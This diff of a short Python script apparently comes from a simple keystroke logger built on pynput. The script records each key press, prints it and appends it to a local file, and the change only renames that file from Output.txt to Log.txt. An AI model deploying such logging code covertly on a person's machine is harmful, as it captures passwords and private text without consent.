@@ -1,7 +1,7 @@
 from pynput import keyboard
 
 def on_press(key):
-    file1 = open("Output.txt","a")
+    file1 = open("Log.txt","a")
     try:
         print('alphanumeric key {0} pressed'.format(key.char))
         file1.write(key.char + '\n')
@@ -18,7 +18,7 @@ def on_release(key):
         return False
 
 def clearFile():
-    file1 = open("Output.txt","w")
+    file1 = open("Log.txt","w")
     file1.write('')
     file1.close()
     
